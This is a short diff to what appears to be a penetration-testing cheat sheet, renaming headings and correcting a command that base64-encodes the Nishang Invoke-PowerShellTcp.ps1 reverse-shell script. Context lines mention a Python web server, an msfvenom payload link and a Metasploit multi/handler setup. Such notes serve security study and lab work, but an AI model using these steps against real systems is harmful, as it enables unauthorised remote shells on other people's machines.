@@ -150,7 +150,7 @@ save
 
 python -m simpleHTTPServer
 
-## Windows nishang shell
+## Nishang
 
 Linux Site:
 
@@ -164,13 +164,13 @@ Windows Site:
 
 Encoded payload:
 
-- cat Invoke-PowerShellTcp.ps1 | iconv -t URF-16LE | base64 -w0 | xclip -selection primaty
+- cat Invoke-PowerShellTcp.ps1 | iconv -t UTF-16LE | base64 -w0 | xclip -selection clipboard
 
 ## Shells
 
 https://www.yeahhub.com/msfvenom-all-payload-examples-cheatsheet-2017/
 
-# Metasploit
+## Metasploit
 
 **Handler**
 - msf> use multi/handler
